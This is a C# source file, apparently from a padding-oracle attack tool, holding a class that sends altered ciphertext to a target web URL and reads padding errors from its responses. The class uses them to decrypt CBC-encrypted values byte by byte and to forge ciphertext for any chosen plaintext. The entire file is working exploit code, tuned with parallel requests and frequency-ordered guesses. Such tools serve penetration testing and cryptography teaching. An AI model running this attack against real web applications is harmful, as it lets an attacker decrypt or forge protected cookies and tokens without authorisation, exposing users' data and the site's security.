using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace PadOracle
{
    public enum POEncoding { b64, b64URL, hex, HEX };
    class CryptTarget
    {
        private readonly int blocksize;
        private readonly int nBlocks;
        private UrlParser parser;
        private readonly DateTime startTime;
        private int totalTries = 0;
        private int mostTries = 0;
        private char worstChar = '\0';
        public int ParallelThreads { get; set; }

        public bool Verbose { get; internal set; }

        public CryptTarget(UrlParser _parser)
        {
            parser = _parser;
            nBlocks = parser.BlockCount;
            blocksize = parser.BlockSize;
            ParallelThreads = -1; // Maximum parallelisation.
            // Initialise stats
            startTime = DateTime.Now;
            // Sanity - does the code we're given work?
            if (!CheckCode(parser.CipherText))
            {
                throw new Exception("We failed to check the given code.");
            }
        }

        public string Decrypt()
        {
            // Ciphertext includes the IV, so we remove one block from the plaintext length.
            int plainLength = parser.CipherText.Length - blocksize;

            var plainBlock = new byte[plainLength]; // Building up the plaintext here
            string txtPlainBlock;


            // I used to go from last block to 1st, to show handling the special case of existing padding 
            // But the message reads better if we go forward.
            ParallelOptions paropts = new ParallelOptions() { MaxDegreeOfParallelism = ParallelThreads };
            Parallel.For(0, nBlocks - 1, paropts, (nBlock) =>
              {
                  byte[] thisPlainBlock = MutateBlock(nBlock, nBlock == nBlocks - 2);

                // Save it for later output
                thisPlainBlock.CopyTo(plainBlock, nBlock * blocksize);

                // Output potential plaintext block.
                if (Verbose)
                  {
                      Console.WriteLine($"Plaintext block {nBlock + 1}/{nBlocks - 1}: {BitConverter.ToString(thisPlainBlock, 0, blocksize)}");
                      int nTake = blocksize;
                    // If last block, take only the first few characters - don't show the padding.
                    if (nBlock == nBlocks - 2)
                      {
                          nTake = blocksize - (int)thisPlainBlock[blocksize - 1];
                      }

                      txtPlainBlock = UTF8Encoding.UTF8.GetString(thisPlainBlock, 0, nTake);
                      Console.WriteLine($"Plain block[{nBlock + 1}/{nBlocks - 1}]: {txtPlainBlock}");
                  }
              }
            );

            // Output the whole thing plus statistics
            plainLength = plainLength - plainBlock[plainLength - 1];
            txtPlainBlock = UTF8Encoding.UTF8.GetString(plainBlock, 0, plainLength);
            if (Verbose)
            {
                Console.WriteLine($"Final message: {txtPlainBlock}");
                Console.WriteLine();
                Console.WriteLine("Statistics:");
                double seconds = (DateTime.Now - startTime).TotalSeconds;
                Console.WriteLine($"\tTime spent: {seconds} - {totalTries / seconds} trials per second.");
                Console.WriteLine($"\tTotal Tries: {totalTries} - Average tries per character: {(double)totalTries / plainBlock.Length}");
                Console.WriteLine($"\tMost tries: {mostTries} - worst char '{worstChar}'");
            }
            return txtPlainBlock;
        }

        private bool CheckCode(byte[] testCipher)
        {
            int retryCount = 5;
            string urlCheck = parser.URLTest(testCipher);
            var wc = WebRequest.CreateHttp(urlCheck);
            wc.KeepAlive = true;
            WebResponse wr = null;
            while (retryCount-- > 0)
            {
                try
                {
                    using (wr = wc.GetResponse())
                    {
                        // If we have a response text to look for, rather than an error code, we can look in the response stream.
                        // But if we're expecting a 404 or some such, it'll be caught lower, and we don't need to do anything.
                        var ws = wr.GetResponseStream();
                        StreamReader sr = new StreamReader(ws);
                        string resp = sr.ReadToEnd();
                        if (resp.ToLower().Contains("paddingexception"))
                        {
                            return false;
                        }
                        return true;
                    }
                }
                catch (WebException x)
                {
                    if (x.Status == WebExceptionStatus.ProtocolError)
                    {
                        return false; // This is Protocol Error, which means padding error. For some sites.
                    }
                    // Some other kind of error - did we get disconnected? Let's retry...
                    Console.Error.WriteLine($"Error: {x.Status} - retrying... {retryCount}");
                    if (((HttpWebResponse)x.Response).StatusCode == HttpStatusCode.InternalServerError)
                    {
                        return false;
                    }
                    throw;
                }
            }
            throw new Exception("Ran out of retries");
        }
        private byte[] Get2CipherBlocks(int nBlock)
        {
            return parser.GetCipherBlock(nBlock).Concat(parser.GetCipherBlock(nBlock + 1)).ToArray();
        }
        private byte[] MutateBlock(int nBlock, bool isLastBlock)
        {
            byte[] testBlock = Get2CipherBlocks(nBlock); // Get blocks C[N-1] & C[N] - nBlock is N-1.
            byte[] mutatedBlock = (byte[])testBlock.Clone(); // We'll modify this one to match padding bytes.
            byte[] intermediate = new byte[blocksize];
            byte[] plainText = new byte[blocksize];
            int padCount;
            int tries = 0;
            byte[] trialValues = EnglishFrequency.Sequence.ToArray();
            if (isLastBlock)
            {
                trialValues = PaddingFrequency32.Sequence.Skip(32 - blocksize).ToArray(); // Padding end bytes.
            }

            // Working backwards through the block.
            for (int j = blocksize - 1; j >= 0; j--)
            {
                padCount = blocksize - j;

                if (isLastBlock && padCount > 1)
                {
                    // We're in the last block, and we've figured out what padding we need.
                    if (padCount <= plainText[blocksize - 1])
                    {
                        // Optimise the padding in the last block - it'll always be plainText[blocksize-1]
                        trialValues[0] = plainText[blocksize - 1]; // Only value worth trying.
                    }
                    else
                    {
                        // Optimise by choosing the right trial frequency set - we could just iterate 0-255.
                        trialValues = EnglishFrequency.Sequence.ToArray(); // Frequency trial.
                    }
                }

                // Set the end of the mutated block to the padding count we're currently trying.
                for (int k = blocksize - 1; k > j; k--)
                {
                    mutatedBlock[k] = (byte)(intermediate[k] ^ padCount);
                }

                tries = 0;

                byte byTarget = mutatedBlock[j];
                // Working forwards through the trial set.

                foreach (byte trialValue in trialValues)
                {
                    int i = byTarget ^ trialValue ^ padCount;
                    mutatedBlock[j] = (byte)i;

                    // Statistics
                    totalTries++;
                    tries++;

                    // Does this trial value result in a correct padding?
                    if (CheckCode(mutatedBlock))
                    {
                        intermediate[j] = (byte)(i ^ padCount);
                        plainText[j] = (byte)(intermediate[j] ^ testBlock[j]);

                        // Output
                        string ch;
                        ch = Encoding.UTF8.GetString(new byte[] { plainText[j] });
                        if (ch[0] < ' ' || ch[0] > 127)
                        {
                            ch = "?";
                        }

                        if (Verbose)
                        {
                            Console.WriteLine($"Plaintext[{nBlock,3}.{j,2}]: {plainText[j],3} {ch} ({tries,3} tries) - C[N-1]={testBlock[j],3}, C[N]={testBlock[j + blocksize],3}, C'[N-1]={i,3}, I[N]={intermediate[j],3}");
                        }

                        // Statistics
                        if (tries > mostTries)
                        {
                            mostTries = tries;
                            worstChar = Encoding.UTF8.GetChars(new byte[] { plainText[j] })[0];
                        }

                        // Stop on success.
                        break;
                    }
                }

            }

            return plainText;
        }

        public string Encrypt(string plainInput)
        {
            byte[] paddedPlainTarget;
            {
                byte[] unpadded = Encoding.UTF8.GetBytes(plainInput);
                int padding = blocksize - (unpadded.Length % blocksize); // 0 => 16; 1 => 15; 2 => 14
                paddedPlainTarget = new byte[padding + unpadded.Length];
                unpadded.CopyTo(paddedPlainTarget, 0);
                for (int i = 0; i < padding; i++)
                {
                    paddedPlainTarget[unpadded.Length + i] = (byte)padding;
                }
            }
            int nBlocks = paddedPlainTarget.Length / blocksize + 1; // 0..N is N+1.
            byte[] randBytes = new byte[blocksize];
            // This doesn't need to be cryptographically random, probably. It could even be constant
            (new Random()).NextBytes(randBytes);
            parser.ClearCipher(nBlocks);
            parser.SetCipherBlock(nBlocks - 1, randBytes);
            byte[] thisPlainBlock;
            byte[] thisCipherBlock = new byte[blocksize];
            // Proceed backwards through the blocks, figuring out what belongs where. Cannot parallelise.
            for (int nBlock = nBlocks - 1; nBlock > 0; nBlock--)
            {
                // Given "some value" in C[N], we evaluate C[N-1], by setting C[N-1] to 0, 'decrypting' the plaintext bytes,
                // and then XORing those decrypted plaintext bytes with our desired plaintext bytes to get the value for C[N-1]
                thisPlainBlock = MutateBlock(nBlock - 1, false);
                for (int i = 0; i < blocksize; i++)
                {
                    thisCipherBlock[i] = (byte)(thisPlainBlock[i] ^ paddedPlainTarget[(nBlock - 1) * blocksize + i]);
                }
                parser.SetCipherBlock(nBlock - 1, thisCipherBlock);
            }
            return parser.URLTest();
        }

    }
}
